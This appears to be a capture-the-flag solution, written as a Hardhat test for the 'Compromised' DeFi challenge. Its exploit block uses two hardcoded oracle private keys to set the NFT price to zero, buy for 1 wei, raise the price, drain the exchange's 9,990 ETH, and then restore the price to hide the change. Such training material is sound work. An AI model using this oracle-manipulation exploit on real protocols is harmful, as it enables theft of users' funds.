const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Compromised challenge', function () {
  const sources = [
    '0xA73209FB1a42495120166736362A1DfA9F95A105',
    '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
    '0x81A5D6E50C214044bE44cA0CB057fe119097850c',
  ];

  let deployer, attacker;
  const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
  const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    const ExchangeFactory = await ethers.getContractFactory(
      'Exchange',
      deployer,
    );
    const DamnValuableNFTFactory = await ethers.getContractFactory(
      'DamnValuableNFT',
      deployer,
    );
    const TrustfulOracleFactory = await ethers.getContractFactory(
      'TrustfulOracle',
      deployer,
    );
    const TrustfulOracleInitializerFactory = await ethers.getContractFactory(
      'TrustfulOracleInitializer',
      deployer,
    );

    // Initialize balance of the trusted source addresses
    for (let i = 0; i < sources.length; i++) {
      await ethers.provider.send('hardhat_setBalance', [
        sources[i],
        '0x1bc16d674ec80000', // 2 ETH
      ]);
      expect(await ethers.provider.getBalance(sources[i])).to.equal(
        ethers.utils.parseEther('2'),
      );
    }

    // Attacker starts with 0.1 ETH in balance
    await ethers.provider.send('hardhat_setBalance', [
      attacker.address,
      '0x16345785d8a0000', // 0.1 ETH
    ]);
    expect(await ethers.provider.getBalance(attacker.address)).to.equal(
      ethers.utils.parseEther('0.1'),
    );

    // Deploy the oracle and setup the trusted sources with initial prices
    this.oracle = await TrustfulOracleFactory.attach(
      await (
        await TrustfulOracleInitializerFactory.deploy(
          sources,
          ['DVNFT', 'DVNFT', 'DVNFT'],
          [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE],
        )
      ).oracle(),
    );

    // Deploy the exchange and get the associated ERC721 token
    this.exchange = await ExchangeFactory.deploy(this.oracle.address, {
      value: EXCHANGE_INITIAL_ETH_BALANCE,
    });
    this.nftToken = await DamnValuableNFTFactory.attach(
      await this.exchange.token(),
    );
  });

  it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    const buyPrice = ethers.utils.parseEther('0.00000000001');
    const sellPrice = ethers.utils.parseEther('9990');

    const key1 =
      '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9';
    const key2 =
      '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48';
    let oracle1 = new ethers.Wallet(key1, ethers.provider);
    let oracle2 = new ethers.Wallet(key2, ethers.provider);

    const tokenSymbol = await this.nftToken.symbol();

    // Change its price to zero
    console.log(
      'NFT price before attack: ',
      String(await this.oracle.getMedianPrice(tokenSymbol)).slice(0, -18),
    );
    await this.oracle.connect(oracle1).postPrice(tokenSymbol, 0);
    await this.oracle.connect(oracle2).postPrice(tokenSymbol, 0);

    // Buy the NFT paying 1 wei
    console.log(
      'NFT price when buying: ',
      String(await this.oracle.getMedianPrice(tokenSymbol)),
    );
    await this.exchange.connect(attacker).buyOne({ value: 1 });

    // Change price of the owned NFT to the balance amount in the Exchange contract
    await this.oracle
      .connect(oracle1)
      .postPrice(tokenSymbol, EXCHANGE_INITIAL_ETH_BALANCE);
    await this.oracle
      .connect(oracle2)
      .postPrice(tokenSymbol, EXCHANGE_INITIAL_ETH_BALANCE);

    // Approve NFT to the exchange and sell it for all  its ETH
    console.log(
      'NFT price when selling: ',
      String(await this.oracle.getMedianPrice(tokenSymbol)).slice(0, -18),
    );
    await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
    await this.exchange.connect(attacker).sellOne(0);

    // Change price back to its original value
    await this.oracle
      .connect(oracle1)
      .postPrice(tokenSymbol, INITIAL_NFT_PRICE);
    await this.oracle
      .connect(oracle2)
      .postPrice(tokenSymbol, INITIAL_NFT_PRICE);
    console.log(
      'NFT price after attack: ',
      String(await this.oracle.getMedianPrice(tokenSymbol)).slice(0, -18),
    );
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Exchange must have lost all ETH
    expect(await ethers.provider.getBalance(this.exchange.address)).to.be.eq(
      '0',
    );

    // Attacker's ETH balance must have significantly increased
    expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(
      EXCHANGE_INITIAL_ETH_BALANCE,
    );

    // Attacker must not own any NFT
    expect(await this.nftToken.balanceOf(attacker.address)).to.be.eq('0');

    // NFT price shouldn't have changed
    expect(await this.oracle.getMedianPrice('DVNFT')).to.eq(INITIAL_NFT_PRICE);
  });
});
